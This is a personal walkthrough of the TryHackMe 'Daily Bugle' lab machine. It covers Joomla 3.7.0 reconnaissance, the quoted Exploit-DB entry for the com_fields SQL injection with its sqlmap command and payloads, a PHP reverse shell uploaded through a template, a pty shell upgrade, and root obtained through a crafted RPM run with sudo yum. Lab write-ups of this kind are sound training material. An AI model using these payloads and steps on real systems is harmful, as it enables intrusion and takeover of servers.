# TryHackMe Daily Bugle Write-Up

![Daily-Bugle](https://github.com/mjohansona2/Walkthru/assets/6199686/adeafecc-0e4e-429e-bdfe-8b18efe65d8e)

This document outlines my journey through the TryHackMe Daily Bugle machine. As my first attempt at a write-up, my goal is to detail the steps taken from initial reconnaissance to gaining root access, highlighting the importance of not leaving sensitive credentials in configuration files.

## Enumeration

### Initial Scans

I initiated the process with an `nmap` scan to identify open ports and running services:

```bash
aingeal@taint  ~/tryhackme/Rooms/DailyBugle  nmap -sC -sV -v -A 10.10.231.192

PORT     STATE    SERVICE  VERSION
22/tcp   open     ssh      OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
80/tcp   open     http     Apache httpd 2.4.6 (CentOS) PHP/5.6.40)
|_http-favicon: Unknown favicon MD5: 1194D7D32448E1F90741A97B42AF91FA
|_http-generator: Joomla! - Open Source Content Management
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
|_http-title: Home
3306/tcp open     mysql    MariaDB (unauthorized)
5859/tcp filtered wherehoo

NSE: Script Post-scanning.
Initiating NSE at 10:58
Completed NSE at 10:58, 0.00s elapsed
Initiating NSE at 10:58
Completed NSE at 10:58, 0.00s elapsed
Initiating NSE at 10:58
Completed NSE at 10:58, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.27 seconds
```

### Directory Enumeration

Next, I used `Gobuster` to discover hidden directories:

```bash
aingeal@taint  ~/tryhackme/Rooms/DailyBugle  gobuster dir -u http://10.10.231.192 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.231.192
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 236] [--> http://10.10.231.192/images/]
/media                (Status: 301) [Size: 235] [--> http://10.10.231.192/media/]
/templates            (Status: 301) [Size: 239] [--> http://10.10.231.192/templates/]
/modules              (Status: 301) [Size: 237] [--> http://10.10.231.192/modules/]
/bin                  (Status: 301) [Size: 233] [--> http://10.10.231.192/bin/]
/plugins              (Status: 301) [Size: 237] [--> http://10.10.231.192/plugins/]
/includes             (Status: 301) [Size: 238] [--> http://10.10.231.192/includes/]
/language             (Status: 301) [Size: 238] [--> http://10.10.231.192/language/]
/components           (Status: 301) [Size: 240] [--> http://10.10.231.192/components/]
/cache                (Status: 301) [Size: 235] [--> http://10.10.231.192/cache/]
/libraries            (Status: 301) [Size: 239] [--> http://10.10.231.192/libraries/]
/tmp                  (Status: 301) [Size: 233] [--> http://10.10.231.192/tmp/]
/layouts              (Status: 301) [Size: 237] [--> http://10.10.231.192/layouts/]
/administrator        (Status: 301) [Size: 243] [--> http://10.10.231.192/administrator/]
/cli                  (Status: 301) [Size: 233] [--> http://10.10.231.192/cli/]
```


### Web Technology Analysis

Using `Wappalyzer`, I identified that the website is powered by Joomla.

![Wappalyzer](https://github.com/mjohansona2/Walkthru/assets/6199686/4bc34a25-4f2d-40c5-88d2-f01a6b5064b2)

### robots.txt Discovery

![Screenshot 2024-03-08 at 11-07-07 Screenshot](https://github.com/mjohansona2/Walkthru/assets/6199686/7ff335ec-8b36-46a6-b4d5-9d5e5227810e)

The `robots.txt` file revealed the path to the administrator page:

![Screenshot 2024-03-08 at 11-05-35 The Daily Bugle - Administration](https://github.com/mjohansona2/Walkthru/assets/6199686/b6729f04-fcb7-447c-bd81-d2c2d982a952)

## Exploitation

### Joomla Version Info

Found the Joomla version info here:

![Joomla-Version](https://github.com/mjohansona2/Walkthru/assets/6199686/ee4d41c6-a8f6-45a0-be6e-6e3672237489)

### Vulnerability Research

With version information in hand, I searched Exploit-DB using `searchsploit`:

```bash
aingeal@taint  ~/tryhackme/Rooms/DailyBugle  searchsploit "Joomla 3.7.0"    
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                                                                                            |  Path
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Joomla! 3.7.0 - 'com_fields' SQL Injection                                                                                                                                                                                                                                | php/webapps/42033.txt
Joomla! Component Easydiscuss < 4.0.21 - Cross-Site Scripting                                                                                                                                                                                                             | php/webapps/43488.txt
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

aingeal@taint  ~/tryhackme/Rooms/DailyBugle  locate 'php/webapps/42033.txt' 
/usr/share/exploitdb/exploits/php/webapps/42033.txt

aingeal@taint  ~/tryhackme/Rooms/DailyBugle  cat /usr/share/exploitdb/exploits/php/webapps/42033.txt      
# Exploit Title: Joomla 3.7.0 - Sql Injection
# Date: 05-19-2017
# Exploit Author: Mateus Lino
# Reference: https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html
# Vendor Homepage: https://www.joomla.org/
# Version: = 3.7.0
# Tested on: Win, Kali Linux x64, Ubuntu, Manjaro and Arch Linux
# CVE : - CVE-2017-8917


URL Vulnerable: http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml%27


Using Sqlmap:

sqlmap -u "http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]


Parameter: list[fullordering] (GET)
    Type: boolean-based blind
    Title: Boolean-based blind - Parameter replace (DUAL)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(CASE WHEN (1573=1573) THEN 1573 ELSE 1573*(SELECT 1573 FROM DUAL UNION SELECT 9674 FROM DUAL) END)

    Type: error-based
    Title: MySQL >= 5.0 error-based - Parameter replace (FLOOR)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 6600 FROM(SELECT COUNT(*),CONCAT(0x7171767071,(SELECT (ELT(6600=6600,1))),0x716a707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT * FROM (SELECT(SLEEP(5)))GDiu)% 
```
### Joomblah Exploitation

The TryHackMe room suggested using a Python script over SQLMap. I found and utilized the [Joomblah](https://github.com/XiphosResearch/exploits/tree/master/Joomblah) script:

![joomblah](https://github.com/mjohansona2/Walkthru/assets/6199686/460b6f62-4807-46fb-a040-11a09dcc6b21)

### Password Cracking

After obtaining credentials, I used `john` to crack the password:

![cracked-hash](https://github.com/mjohansona2/Walkthru/assets/6199686/372eb638-e881-4a59-bddf-04700f52635d)

### Gaining Initial Access

Logging into the admin panel led me to upload a [reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) and gain initial access to the machine as the `apache` user by updating the index.php for the default beez3 template and clicking on Template Preview which got me my shell:

![reverse-shell](https://github.com/mjohansona2/Walkthru/assets/6199686/2bf86405-8443-4b88-808e-bf424251484e)

### Upgrading to Interactive Shell

To improve my shell, I executed:

```bash
python -c "import pty;pty.spawn('/bin/bash')"
export TERM=xterm; export SHELL=/bin/bash
CTRL+Z
stty raw -echo;fg
```

### Privilege Escalation

Despite initial limitations (no direct switch to another user, no sudo privileges, no cron jobs to exploit), I persevered.

Failed to find sudo options:

![no-sudo](https://github.com/mjohansona2/Walkthru/assets/6199686/333b93f5-9ddc-4d73-b3e7-1845e2beae42)

Failed su to user:

![no-su](https://github.com/mjohansona2/Walkthru/assets/6199686/10b8cc4c-238d-43c3-a074-2d73a49d6712)

No cron options to exploit:

![no-cron](https://github.com/mjohansona2/Walkthru/assets/6199686/93004a9b-7795-4914-846a-abc19a7b47a0)

Looking around I found a configuration.php file with possabilities:

![stable-shell](https://github.com/mjohansona2/Walkthru/assets/6199686/69e02d29-2990-42fc-976f-a5bf66349103)

root credential:

![credentials](https://github.com/mjohansona2/Walkthru/assets/6199686/c1d2ebbc-b1c4-43c1-a60b-e41f84f6b626)

Password didn't work with root, but it did work with the user (which also got me the user.txt flag file):

![usertxt](https://github.com/mjohansona2/Walkthru/assets/6199686/b398c652-c284-4f87-8389-993194ce8f2a)

### Finding Sudo Options

Exploring the system further revealed sudo options for the current user:

![sudo](https://github.com/mjohansona2/Walkthru/assets/6199686/d9e087dd-06d7-4041-b5a2-76142946f70c)

### Crafting and Executing the Exploit

Did some google searching on how to exploit the users sudo access. I found i could exploit `yum` with its unrestricted access via [fpm](https://fpm.readthedocs.io/en/latest/installation.html). To exploit this, I crafted an RPM package designed to execute a script which adds the user jjameson to the sudoers file. This modification permits the use of all commands as the root user without restrictions. Utilizing fpm, I then transferred this package to the target system and executed it, successfully obtaining root access:

![fpm](https://github.com/mjohansona2/Walkthru/assets/6199686/98da9dcc-bf36-4917-b6ee-59f3a960777e)

Then created a local python http server to upload the file and wget it to the users directory:

![download1](https://github.com/mjohansona2/Walkthru/assets/6199686/cc00e9fd-12ee-4f34-931c-fb206fca4f75)
![download2](https://github.com/mjohansona2/Walkthru/assets/6199686/7e1ac201-1821-4b67-943c-34f61a0dcf8e)

Install the rpm:

![rpm](https://github.com/mjohansona2/Walkthru/assets/6199686/7bc651cf-aa5f-45be-bf4b-ebf5def2b487)

Now we have root and the final root.txt flag file:

![root](https://github.com/mjohansona2/Walkthru/assets/6199686/ac2b6257-ce45-4f2a-9917-11dd20c5a19d)


## Conclusion

Completing the Daily Bugle machine was both challenging and rewarding. It served as a practical reminder of the risks associated with leaving sensitive information in configuration files. 
